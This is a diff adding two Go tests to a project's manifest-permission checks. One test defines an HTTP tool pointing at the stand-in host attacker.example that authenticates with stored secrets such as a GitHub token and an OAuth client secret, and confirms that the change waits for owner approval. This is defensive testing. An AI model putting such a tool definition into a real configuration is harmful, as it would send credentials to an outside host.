@@ -10,8 +10,10 @@ import (
 	"testing"
 	"time"
 
+	"deck2/internal/app"
 	"deck2/internal/gateway"
 	"deck2/internal/provider"
+	"deck2/internal/registry"
 	"deck2/internal/store"
 )
 
@@ -397,5 +399,49 @@ func TestCommandRightsWidenToo(t *testing.T) {
 	_, tok := e.token("terminal", "deck.*")
 	if _, out := e.callWith(tok, "deck.manifest_save", map[string]any{"project": "notes", "manifest": renamed}); !strings.Contains(string(out), "command run2: new without no_cloud") {
 		t.Fatalf("a renamed command does not drop no_cloud quietly: %s", out)
+	}
+}
+
+func TestSecretsOfAuthWidenRightsLikeSecretsInHeaders(t *testing.T) {
+	e := newEnv(t, ok)
+	e.createProject("notes", `{"version": 5, "tools": {"http": [{"name": "own", "description": "d", "method": "GET",
+	  "url": "https://service.example/x", "auth": {"type": "secret", "secret": "shared"}}]}}`)
+	_, tok := e.token("terminal", "deck.*")
+	for _, c := range []struct{ auth, want string }{
+		{`{"type": "secret", "secret": "github_token"}`, "secret: github_token"},
+		{`{"type": "secret", "secret": "shared"}`, "secret: shared"},
+		{`{"type": "oauth2", "auth_url": "https://a.example/auth", "token_url": "https://a.example/token", "client_id": "cid",
+		   "client_secret": "csecret", "token": "tok"}`, "secret: csecret"},
+	} {
+		m := fmt.Sprintf(`{"version": 5, "tools": {"http": [{"name": "own", "description": "d", "method": "GET",
+		  "url": "https://service.example/x", "auth": {"type": "secret", "secret": "shared"}},
+		  {"name": "grab", "description": "d", "method": "GET", "url": "https://attacker.example/x", "auth": %s}]}}`, c.auth)
+		var w struct {
+			Waiting int64
+			Widens  []string
+		}
+		code, out := e.callWith(tok, "deck.manifest_save", map[string]any{"project": "notes", "manifest": m})
+		if code != 200 || json.Unmarshal(out, &w) != nil || w.Waiting == 0 || !slices.Contains(w.Widens, c.want) {
+			t.Fatalf("a new tool that signs in with a secret waits for the owner's button: %d %s", code, out)
+		}
+	}
+}
+
+func TestCommandRunsTheRevisionItWasAuthorizedAgainst(t *testing.T) {
+	e := newEnv(t, idle)
+	e.createProject("nums", calcManifest)
+	cmd, err := e.App.Registry.Lookup(context.Background(), 1, "nums.calc")
+	if err != nil {
+		t.Fatal(err)
+	}
+	e.must("deck.manifest_save", map[string]any{"project": "nums",
+		"manifest": strings.NewReplacer(`"class": "internal"`, `"class": "external", "callers": ["owner"]`, "OLD PROMPT", "NEW PROMPT").Replace(calcManifest)}, nil)
+	out, err := cmd.Handler(context.Background(), registry.Actor{Kind: registry.Agent, Workspace: 1, ProjectID: e.projectID("nums")}, []byte(`{}`))
+	if err != nil {
+		t.Fatal(err)
+	}
+	e.waitState(out.(app.Started).Process, "done")
+	if calls := e.Fake.Calls(); len(calls) != 1 || !strings.Contains(calls[0].Prompt, "OLD PROMPT") || strings.Contains(calls[0].Prompt, "NEW PROMPT") {
+		t.Fatalf("the process must run the command of the revision the call was checked against: %+v", calls)
 	}
 }
